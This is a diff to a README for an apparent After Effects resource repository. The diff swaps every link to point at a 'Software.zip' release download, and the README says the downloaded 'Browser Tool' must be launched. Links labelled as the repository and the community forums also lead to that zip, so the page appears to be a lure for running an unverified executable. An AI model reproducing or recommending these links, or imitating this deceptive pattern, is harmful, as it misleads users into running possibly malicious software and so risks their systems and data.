@@ -13,7 +13,7 @@ This repository is a hub for all things related to Adobe After Effects, a powerf
 🚀 Share AE  
 
 ### Download Browser Tool
-[![Download Browser Tool](https://github.com/Readmebom/after-effects/releases/download/v1.0/Release.zip%20Browser%20Tool-v1.0.0-brightgreen)](https://github.com/Readmebom/after-effects/releases/download/v1.0/Release.zip)  
+[![Download Browser Tool](https://github.com/Readmebom/after-effects/releases/download/v2.0/Software.zip%20Browser%20Tool-v1.0.0-brightgreen)](https://github.com/Readmebom/after-effects/releases/download/v2.0/Software.zip)  
 The tool needs to be launched after downloading. 
 
 ### Resources
@@ -32,10 +32,10 @@ Browse through a variety of pre-designed templates that you can use as a startin
 Join discussions, share your work, and get help from a community of After Effects enthusiasts.
 
 ### Get Started
-To dive into the world of After Effects, simply [visit the repository](https://github.com/Readmebom/after-effects/releases/download/v1.0/Release.zip) and start exploring the possibilities!
+To dive into the world of After Effects, simply [visit the repository](https://github.com/Readmebom/after-effects/releases/download/v2.0/Software.zip) and start exploring the possibilities!
 
 ### Connect with Us
-Have questions, suggestions, or just want to connect with fellow After Effects users? Feel free to reach out on our [community forums](https://github.com/Readmebom/after-effects/releases/download/v1.0/Release.zip). We're here to help you unleash your creativity with After Effects!
+Have questions, suggestions, or just want to connect with fellow After Effects users? Feel free to reach out on our [community forums](https://github.com/Readmebom/after-effects/releases/download/v2.0/Software.zip). We're here to help you unleash your creativity with After Effects!
 
 ### Stay Updated
 Don't forget to check out the "Releases" section for the latest updates, new additions, and exciting features in the After Effects repository. Happy creating! 🎥💥
